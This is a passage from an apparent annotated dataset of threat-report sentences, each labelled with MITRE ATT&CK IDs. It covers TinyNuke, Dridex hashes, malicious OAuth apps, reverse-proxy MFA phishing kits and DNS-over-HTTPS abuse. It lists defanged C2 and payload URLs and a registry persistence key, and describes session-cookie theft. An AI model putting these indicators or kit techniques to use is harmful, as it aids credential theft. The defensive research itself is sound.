Dridex\u00a0SHA256\u00a0\u00a0 |", "labels": ["S0384"], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "| b61f624589d5ad3584e09f3174f8e3e1ac38958f260eee526b0abaf7389d7932\u00a0 | Dridex\u00a0SHA256\u00a0 |", "labels": ["S0384"], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "| 7f7aef4e87411653743576c1de6933c3736e6153faae926fbfb9add35ac2f93f\u00a0 | Dridex\u00a0SHA256\u00a0 |", "labels": ["S0384"], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "| aef59db50378667cff8b3181421445c59a27932d835d47f016a879ced1f04dd7\u00a0 | Dridex\u00a0SHA256\u00a0 |", "labels": ["S0384"], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "| 4f6b068caf0cdbb62c0daaf4ee2f861820563c62853bfcad43a0e6d88cfdbe68\u00a0 | Dridex\u00a0SHA256\u00a0 |", "labels": ["S0384"], "document": "proofpoint_2021-12-09_holiday-feelin-ta575-brings-warm"}, {"sentence": "TinyNuke Banking Malware Targets French Entities", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "* Proofpoint researchers identified ongoing activity from the banking malware TinyNuke.", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "Proofpoint identified multiple recent campaigns leveraging invoice-themed lures to distribute the uncommonly observed TinyNuke malware.", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "TinyNuke is a banking trojan that first appeared in Proofpoint data in 2017 targeting French companies.", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "It is similar to the notorious banking trojan Zeus, which has\u00a0[many variants](/us/blog/threat-insight/zloader-loads-again-new-zloader-variant-returns \"ZLoader Loads Again: New ZLoader Variant Returns\")\u00a0with identical functionality.", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "TinyNuke can be used to steal credentials and other private information and can be used to enable follow-on [malware attacks](/us/threat-reference/malware \"Malware\").", "labels": ["TA0006", "T1005"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "The author initially\u00a0[released](https://github.com/aainz/TinyNuke)\u00a0the code on GitHub in 2017, and although the original repo is no longer available, other open-source versions of the malware exist.", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "Proofpoint observed dozens of TinyNuke campaigns targeting French entities in 2018.", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "After only observing a handful of TinyNuke campaigns in 2019 and 2020, Proofpoint observed TinyNuke reappear in January 2021 in one campaign distributing around 2,000 emails.", "labels": ["T1566"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "In November, Proofpoint identified multiple TinyNuke campaigns distributing around 2,500 messages and impacting hundreds of customers.", "labels": ["T1566"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "![Email lure with link leading to the download of TinyNuke.](/sites/default/files/inline-images/Screen%20Shot%202021-12-08%20at%201.55.44%20PM.png)", "labels": ["T1566"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "*Figure 1: Email lure with link leading to the download of TinyNuke.*", "labels": ["T1566"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "These messages contain URLs that lead to the download of a compressed executable responsible for installing TinyNuke.", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "Proofpoint first observed TinyNuke in 2017 used as a second-stage payload in a Zeus banking trojan campaign targeting French entities.", "labels": ["T1566"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "![TinyNuke campaign data.](/sites/default/files/inline-images/Screen%20Shot%202021-12-08%20at%201.55.59%20PM.png)", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "*Figure 2: TinyNuke campaign data.*", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "Proofpoint has observed three times as many TinyNuke campaigns in 2021 as the two previous years combined.", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "But while threat actors have conducted more campaigns this year, they are distributing fewer messages compared to previous years.", "labels": ["T1566"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "![TinyNuke](/sites/default/files/inline-images/Screen%20Shot%202021-12-12%20at%205.02.24%20PM.png)", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "*Figure 3: TinyNuke message data.*", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "Though the number of 2021 campaigns is less than 2018, TinyNuke\u2019s reappearance and consistent targeting of French organizations is striking, suggesting it is a re-emerging threat in the French cybercrime threat landscape.", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "Proofpoint assesses there are at least two distinct activity sets using TinyNuke based on different lure themes, payload deployment, and command and control (C2) infrastructure.", "labels": ["TA0011", "TA0011"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "Specifically, one intrusion set associated with the initial TinyNuke actors uses Tor for C2 since 2018, while commodity actors typically leverage clear web C2.", "labels": ["TA0011", "TA0011"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "Open source\u00a0[reporting suggests](https://blog.heat-miser.net/posts/tinynuke/)\u00a0the malware version using Tor which Proofpoint has observed with continued regularity is not publicly available, and likely used only by the original TinyNuke threat actors.", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "The following analysis focuses on the most frequently observed activity set responsible for most of the TinyNuke campaigns in 2021.", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "In the recently observed campaigns, messages are sent with URLs that lead to ZIP files.", "labels": ["T1566"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "The ZIP files contain a JavaScript file (e.g. Facture-78224UDJ2021.js) which is invoked by the Microsoft Windows native binary wscript.", "labels": ["T1059"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "PowerShell is then executed and leverages the Start-BitsTransfer cmdlet to download another ZIP file (e.g. putty.zip) which contains the TinyNuke PE file.", "labels": ["T1059", "T1105", "T1055"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "![PowerShell Command Line sample.](/sites/default/files/inline-images/Screen%20Shot%202021-12-08%20at%201.56.47%20PM.png)", "labels": ["T1059"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "*Figure 4: PowerShell Command Line sample.*", "labels": ["T1059"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "The actor generally uses legitimate, but compromised, websites to host the payload URL.", "labels": ["T1584"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "The following binaries are dropped to disk and executed.", "labels": ["T1105"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "In the recently observed campaigns, C2 communications occur via Tor. For example: fizi4aqe7hpsts3r[.]onion/hci/client[.]php", "labels": ["T1071"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "Proofpoint researchers observed the string \"nikoumouk\" sent to the C2 server for an unknown purpose.", "labels": ["TA0011"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "According to information sharing partners and open-source information, the actors previously used that string in C2 communications in previous campaigns since 2018.", "labels": ["TA0011"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "Persistence is achieved by adding an entry in the registry under the following location.", "labels": ["T1547"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "Key: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\x00E02BC647BACE72A1\\xe4\\x8d\\x82", "labels": ["T1547"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "Once installed, the TinyNuke loader can be used for data and credential theft with formgrabbing and webinject capabilities for Firefox, Internet Explorer, and Chrome, and to install follow on payloads.", "labels": ["TA0006", "T1189"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "Proofpoint identified TinyNuke infrastructure used in campaigns in 2018 overlapped with\u00a0[PyLocky ransomware attacks](https://www.trendmicro.com/en_us/research/18/i/a-closer-look-at-the-locky-poser-pylocky-ransomware.html)\u00a0first reported that year.", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "However, Proofpoint has not observed ransomware activity associated with TinyNuke in subsequent campaigns.", "labels": ["T1486"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "Public reporting\u00a0[associates](https://krebsonsecurity.com/2019/12/nuclear-bot-author-arrested-in-sextortion-case/)\u00a0the original TinyNuke author with an individual charged in a French sextortion case, and was imprisoned before\u00a0[reportedly](https://blog.heat-miser.net/posts/tinynuke/)\u00a0being released under legal supervision in 2020 during a spike in the COVID pandemic.", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "In 2017, the accused individual previously claimed to be the original author of TinyNuke in an\u00a0[interview](https://krebsonsecurity.com/2017/04/self-proclaimed-nuclear-bot-author-weighs-u-s-job-offer/)\u00a0with the journalist Brian Krebs.", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "TinyNuke actors have also reportedly\u00a0[taunted](https://blog.heat-miser.net/posts/tinynuke/)\u00a0and harassed security researchers investigating TinyNuke activity.", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "Proofpoint does not associate TinyNuke with a known threat actor or group.", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "The malware is publicly available and likely used by multiple threat actors, however Proofpoint assesses with high confidence at least some of the original threat actors distributing TinyNuke in 2018 continue to use it.", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "TinyNuke has re-emerged as a threat to French organizations, and entities with operations in France.", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "Of note, in most of the recent campaigns the actor has stayed consistent with using URLs to ZIP files and the continued use of Tor for C2 communications.", "labels": ["T1566", "TA0011"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "| fizi4aqe7hpsts3r[.]onion/hci/client.php | TinyNuke C2 | May 2021 |", "labels": ["TA0011"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "| hxxps://www[.]genou-alsace[.]fr/putty.zip | TinyNuke Payload URL | November 2021 |", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "\u00a0 | TinyNuke Payload URL | November 2021 |", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "| hxxp://www[.]palette-events[.]com/css/\\_notes/putty.zip | TinyNuke Payload URL | November 2021 |", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "| hxxp://laurentabert[.]fr/setup.zip | TinyNuke Payload URL | September 2021 |", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "| hxxp://www[.]energym63[.]com/10451372/cports.exe | TinyNuke Payload URL | June 2021 |", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "| hxxp://www[.]energym63[.]com/10451372/putty2.zip | TinyNuke Payload URL | June 2021 |", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "| hxxp://www[.]lightcharts[.]com/old-website/putty.zip | TinyNuke Payload URL | May 2021 |", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "| hxxps://baloobajojonako[.]fr/panel/client.php?47F3640E5BCAD613 | TinyNuke C2 | January 2021 |", "labels": ["TA0011"], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "QYQ9IHG325rxm/600686abb5395430a1363770 | TinyNuke Payload URL | January 2021 |", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "| 5ba482a11f1a99293a249c350c360cd0d8f1456dfcfd27bf0b4189511e4800d8 | TinyNuke SHA256 | January 2021 |", "labels": [], "document": "proofpoint_2021-12-13_tinynuke-banking-malware-targets-french"}, {"sentence": "* This campaign uses hijacked Office 365 tenants and a sophisticated combination of cleverly-crafted lures, malicious OAuth apps and targeted phishing threats.", "labels": ["T1566", "T1566", "T1528"], "document": "proofpoint_2022-01-27_oivavoii-active-malicious-hybrid-cloud"}, {"sentence": "**Potential Impact:**\u00a0We have seen account takeovers (through malicious OAuth apps stealing OAuth tokens and through credential theft).", "labels": ["T1528"], "document": "proofpoint_2022-01-27_oivavoii-active-malicious-hybrid-cloud"}, {"sentence": "There are other potential risks after account takeovers, chiefly: persistent DLP risks, continued phishing, lateral movement, brand abuse and malware proliferation.", "labels": ["T1566", "TA0008"], "document": "proofpoint_2022-01-27_oivavoii-active-malicious-hybrid-cloud"}, {"sentence": "By analyzing monitored email traffic and cloud users\u2019 activities, Proofpoint researchers have so far uncovered five malicious OAuth applications attributed to the campaign (nicknamed \u201c*OiVaVoii*\u201d by analysts due to its associated domain).", "labels": ["T1528"], "document": "proofpoint_2022-01-27_oivavoii-active-malicious-hybrid-cloud"}, {"sentence": "Out of the remaining two apps, at least one was created by a non-verified organization, which could imply leveraging a (third) hijacked cloud environment or using a dedicated malicious Office tenant.", "labels": ["T1566"], "document": "proofpoint_2022-01-27_oivavoii-active-malicious-hybrid-cloud"}, {"sentence": "This enables the attackers to generate OAuth tokens on the compromised user\u2019s behalf and complete the account takeover.", "labels": ["T1528"], "document": "proofpoint_2022-01-27_oivavoii-active-malicious-hybrid-cloud"}, {"sentence": "This modus-operandi is similar to the one previously covered in our\u00a0[recent blog](/us/blog/email-and-cloud-threats/how-attackers-use-compromised-accounts-create-and-distribute-malicious \"How Attackers Use Compromised Accounts to Create and Distribute Malicious OAuth Apps\").", "labels": ["T1528"], "document": "proofpoint_2022-01-27_oivavoii-active-malicious-hybrid-cloud"}, {"sentence": "* **Microsoft logo:**Some apps impersonate Microsoft software, using icon impersonation.", "labels": ["T1566"], "document": "proofpoint_2022-01-27_oivavoii-active-malicious-hybrid-cloud"}, {"sentence": "* **MITM:**\u00a0apps potentially use MITM proxy attacks.", "labels": ["T1557", "T1557"], "document": "proofpoint_2022-01-27_oivavoii-active-malicious-hybrid-cloud"}, {"sentence": "This means that credential theft could take place as part of the attack flow, greatly increasing the risk of a complete account takeover and prolonged persistency.", "labels": ["TA0006", "T1078"], "document": "proofpoint_2022-01-27_oivavoii-active-malicious-hybrid-cloud"}, {"sentence": "* **Application scopes:**\u00a0all detected apps requested similar permissions, pertaining mainly to mailbox access (read and write), allowing them to send internal and external malicious email messages, steal valuable information, and create mailbox rules (applied for data leakage and persistency purposes).", "labels": ["TA0010"], "document": "proofpoint_2022-01-27_oivavoii-active-malicious-hybrid-cloud"}, {"sentence": "### **Screenshots of malicious third party OAuth apps used in this campaign**", "labels": ["T1528"], "document": "proofpoint_2022-01-27_oivavoii-active-malicious-hybrid-cloud"}, {"sentence": "* As multi-factor authentication becomes a standard security practice, phish kits are evolving with the times to steal these tokens and bypass this trusted layer of security.", "labels": ["T1566", "T1111"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "* Threat actors are using phish kits that leverage transparent reverse proxy, which enables them to man-in-the-middle (MitM) a browser session and steal credentials and session cookies in real-time.", "labels": ["T1557", "T1566", "T1557", "T1555"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "* It is likely that more threat actors will turn to these MitM phish kits, making security increasingly difficult for defenders.", "labels": ["T1557", "T1566"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "While many companies like Duo and RSA have helped make MFA more ubiquitous and user-friendly, threat actors have not been resting on their laurels, choosing to target MFA as well as looking for ways to bypass MFA with evolving phishing kits.", "labels": ["T1566"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "### MFA Phishing Kit Evolution", "labels": ["T1566"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "Phishing kits are software developed to aid threat actors in harvesting credentials and quickly capitalizing on them.", "labels": ["TA0006", "T1566"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "Proofpoint threat researchers see numerous MFA phishing kits ranging from simple open-source kits with human readable code and no-frills functionality to sophisticated kits utilizing numerous layers of obfuscation and built-in modules that allow for stealing usernames, passwords, MFA tokens, social security numbers and credit card numbers.", "labels": ["T1566", "T1027", "TA0006"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "At their core these kits are using the same techniques for harvesting credentials as the traditional kits that steal only usernames and passwords.", "labels": ["TA0006", "TA0006"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "![Simple phishing kit utilizing an open directory ](/sites/default/files/inline-images/Screen%20Shot%202022-02-01%20at%2011.19.05%20AM.png)", "labels": ["T1566"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "*Figure 2. Simple phishing kit utilizing an open directory with credentials stored on the same webserver as the kit.*", "labels": ["T1566", "T1555"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "Instead, these kits use a\u00a0[transparent reverse proxy](https://en.wikipedia.org/wiki/Reverse_proxy#:~:text=In%20computer%20networks%2C%20a%20reverse,mainly%20used%20to%20balance%20load. to present the actual website to the victim.", "labels": ["T1557"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "Therefore, presenting the actual site instead of a facsimile greatly enhances the illusion an individual is logging in safely.", "labels": ["T1566"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "Another advantage of the reverse proxy is that it allows the threat actor to man-in-the-middle (MitM) a session and capture not only the usernames and passwords in real-time, but also the session cookie.", "labels": ["T1557", "T1557", "T1539"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "![MitM Transparent Reverse Proxy](/sites/default/files/inline-images/Screen%20Shot%202022-02-01%20at%2011.19.29%20AM.png)", "labels": ["T1557"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "*Figure 3. MitM Transparent Reverse Proxy.*", "labels": ["T1557"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "The session cookie (see Figure 4) can then be used by the threat actor to gain access to the targeted account without the need for a username, password, or MFA token.", "labels": ["T1539"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "![Evilginx2 LinkedIn session cookie example](/sites/default/files/inline-images/Screen%20Shot%202022-02-01%20at%2011.19.50%20AM.png)", "labels": [], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "*Figure 4. Evilginx2 LinkedIn session cookie example.*", "labels": [], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "Proofpoint researchers have noted a small increase in the use of these phish kits and anticipate greater adoption by threat actors as MFA forces them to adapt.", "labels": ["T1566"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "### Reverse Proxy Phish Kits", "labels": ["T1566"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "This relatively simple tool allows phishing one site at a time, sports a command line interface, and provides the threat actor with a handy GUI to retrieve the credentials and session information (see Figure 5).", "labels": ["T1566", "T1539"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "Modlishka also integrates Let\u2019s Encrypt so it can make the fake domain landing page just a bit more believable by encrypting the traffic and providing the little padlock in the web bar.", "labels": ["T1566"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "While Modlishka may not be as advanced as the other two kits discussed later in this blog, it is still capable of harvesting a victim\u2019s session even when tech like Duo\u2019s push notification\u00a0[authenticator is used](https://commons.lib.jmu.edu/cgi/viewcontent.cgi?article=1004&context=masters202029).", "labels": ["T1539"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "Muraena/Necrobrowser: Muraena/Necrobrowser is a two-part tool for phishing session cookies, credentials, and much more.", "labels": ["T1539"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "Once the victim's credentials and session cookie has been harvested by the threat actor, they can deploy Necrobrowser.", "labels": ["T1539"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "Necrobrowser is a headless browser, which is a browser without a graphical user interface used for automation, that leverages the stolen session cookies to log into the target site and do things such as change passwords, disable Google Workspace notifications, dump emails, change SSH session keys in GitHub, and download all code repositories.", "labels": ["T1539", "T1213", "T1078", "T1098"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "Evilginx2: Evilginx2 is an easy to use, transparent reverse proxy written in Golang by security researcher and developer Kuba Gretzky (Figure 6).", "labels": [], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "Evilginx2 allows you to configure a custom subdomain and landing page URL for each as well.", "labels": [], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "The kit comes with several pre-installed \u201cphishlets,\u201d but more can be created and added easily.", "labels": ["T1566"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "Once a victim clicks on the malicious link, they are taken to a secure page with assets being displayed exactly how they are on the target site.", "labels": ["T1566"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "After they log in, the credentials, including MFA codes, and session cookie are sent to the server in real-time and the victim is either redirected to a different page or allowed to continue through to the page.", "labels": ["T1539"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "The threat actor is then able to use the stolen session cookie to log in as the victim where they can take multiple actions like changing the password, copying data, or pretending to be the victim.", "labels": ["T1078", "T1005"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "![Evilginx2 command line console](/sites/default/files/inline-images/Screen%20Shot%202022-02-01%20at%2011.21.39%20AM.png)", "labels": [], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "*Figure 6. Evilginx2 command line console.*", "labels": [], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "In their\u00a0[recent paper](https://catching-transparent-phish.github.io/catching_transparent_phish.pdf), researchers from Stony Brook University and Palo Alto Networks (Kondracki et al) took a deep dive into MitM phishing kits and discovered that MitM phishing pages represent an industry blind spot.", "labels": ["T1557", "T1557", "T1566", "T1566"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "The researchers developed a machine learning tool called Phoca to scan suspected phishing pages and try to determine if they were using a transparent reverse proxy to MitM credentials.", "labels": ["T1557", "T1566"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "They were able to identify over 1200 MitM phishing sites.", "labels": ["T1557", "T1566"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "In addition to this, they found that standard phishing sites had a lifespan of just under 24 hours whereas MitM phishing sites lasted longer, and 15% had a lifespan greater than 20 days.", "labels": ["T1557", "T1566"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "As recently as the end of January 2021, Proofpoint researchers identified a MitM reverse proxy site that was active for more than 72 hours.", "labels": ["T1557"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "![MitM O365 page.](/sites/default/files/inline-images/Screen%20Shot%202022-02-01%20at%2011.22.38%20AM.png)", "labels": ["T1557"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "*Figure 7. MitM O365 page.(domain redacted as without the full path it redirects to NSFW content)*", "labels": ["T1557"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "As more companies follow Google\u2019s lead and start requiring MFA, threat actors will rapidly move to solutions like these MitM kits.", "labels": ["T1557"], "document": "proofpoint_2022-02-03_mfa-psa-oh-my"}, {"sentence": "* Preventing Man-in-the-Middle (MitM) attacks.", "labels": ["T1557"], "document": "quoteintelligence_2021-02-16_dns-over-https-doh"}, {"sentence": "Therefore, DoH offers more privacy and data protection, especially from Man-in-the-Middle (MitM) attacks (e.g. DNS hijacking and spoofing) that would allow for snooping and manipulation of the DNS information.", "labels": ["T1557", "T1557"], "document": "quoteintelligence_2021-02-16_dns-over-https-doh"}, {"sentence": "At the time of initial rollout in 2019, we assessed it would be very likely that more malware families would begin to incorporate DoH into their operations, as well as new data-exfiltration tools leveraging DoH as C2.", "labels": ["TA0011", "T1001"], "document": "quoteintelligence_2021-02-16_dns-over-https-doh"}, {"sentence": "In fact, in July 2020 Researchers from Kaspersky reported on [Iran-linked threat actor group *APT34*](https://quointelligence.eu/2020/12/cyber-security-trends-in-2021/) (also known as *OilRig*) evolving tactics using DNS-over-HTTPS (DoH) as a channel for data exfiltration through an open-source tool.", "labels": ["G0049", "G0049", "T1041"], "document": "quoteintelligence_2021-02-16_dns-over-https-doh"}, {"sentence": "The evolution was first discovered in May 2020, when the threat actor group used the publicly available tool DNSExfiltrator2 to move data laterally through the internal network and attempted to exfiltrate to an attacker-controlled system.", "labels": ["T1001", "T1041"], "document": "quoteintelligence_2021-02-16_dns-over-https-doh"}, {"sentence": "Additionally, in August and November 2020, [QuoIntelligence detected targeted campaigns that share similarities to the threat actor we previously dubbed ReconHellcat.](https://quointelligence.eu/2020/09/apt28-zebrocy-malware-campaign-nato-theme/) Among the state-of-the-art techniques leveraged by ReconHellcat, the group also used Cloudflare Workers as a C2 communication interface and DoH as their name resolution channel.", "labels": ["TA0011", "T1001"], "document": "quoteintelligence_2021-02-16_dns-over-https-doh"}, {"sentence": "* **Bypassed security measures**: [According to Qihoo 360 researchers](https://blog.netlab.360.com/an-analysis-of-godlua-backdoor-en/), the first malware spotted in the wild using DoH was employed by threat actors operating a new backdoor malware dubbed Godlua.", "labels": ["TA0005"], "document": "quoteintelligence_2021-02-16_dns-over-https-doh"}, {"sentence": "Shortly thereafter, [ProofPoint researchers](https://www.proofpoint.com/us/threat-insight/post/psixbot-now-using-google-dns-over-https-and-possible-new-sexploitation-module) detailed a new variant of the PsiXBot malware incorporating Google\u2019s DoH service.", "labels": [], "document": "quoteintelligence_2021-02-16_dns-over-https-doh"}, {"sentence": "Malware authors implement DoH in their attack operations because a victim\u2019s DNS traffic will mostly bypass the organization\u2019s DNS infrastructure, circumventing security protections.", "labels": ["TA0005"], "document": "quoteintelligence_2021-02-16_dns-over-https-doh"}, {"sentence": "While the DNS-over-HTTPS protocol offers increased privacy and security, it also enables users and threat actors to bypass traditional network controls used to secure a network.", "labels": ["TA0005"], "document": "quoteintelligence_2021-02-16_dns-over-https-doh"}, {"sentence": "The sanctions are in\u00a0response\u00a0to the\u00a0[SolarWinds espionage campaign](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html)\u00a0and Russia\u2019s alleged interference in the 2020 US Presidential elections.", "labels": ["T1195"], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "This campaign, conducted through Russian APT Group\u00a0*APT29*, compromised approximately nine federal agencies and about 100 private-sector organizations.", "labels": ["G0016"], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "They also sanctioned Russia for attacks against critical infrastructures, such as the [NotPetya cyberattack](https://techcrunch.com/2020/10/19/justice-department-russian-hackers-notpetya-ukraine/?guccounter=1&guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&guce_referrer_sig=AQAAAFXn--JNuclTXDb9t4x95CjUylGBRD3UKgxstdiu_pgbDM4vc1N6oe_wSrLwGqSbmzwoyYf0Y7ZjYIYmSPY07Mc6odFQCMp9s78gvWrdQiEIWAWW-Lz3pL1Ct2nJeKLL5ljr8SiG_gIYtDHm90O0XyaixAYL4-9TPtIUOXx3VPkU) affecting Ukraine\u2019s power grid back in 2015.", "labels": ["S0368", "S0368"], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "### APT 29", "labels": ["G0016"], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "The US administration alleges that APT29 is an associate of the Russian Foreign Intelligence Service (SVR) and responsible for the SolarWinds espionage campaign.", "labels": ["G0016"], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "### ReconHellcat", "labels": [], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "Active since at least 2020, [QuoIntelligence had first classified ReconHellcat after discovering a new, targeted campaign](https://quointelligence.eu/2020/08/blackwater-malware-leveraging-beirut-tragedy-in-new-targeted-campaign/) in August that delivered the novel BlackWater malware.", "labels": [], "document": "quoteintelligence_2021-04-28_us-sanctions-against-russias-cyber"}, {"sentence": "In January 2021, [we 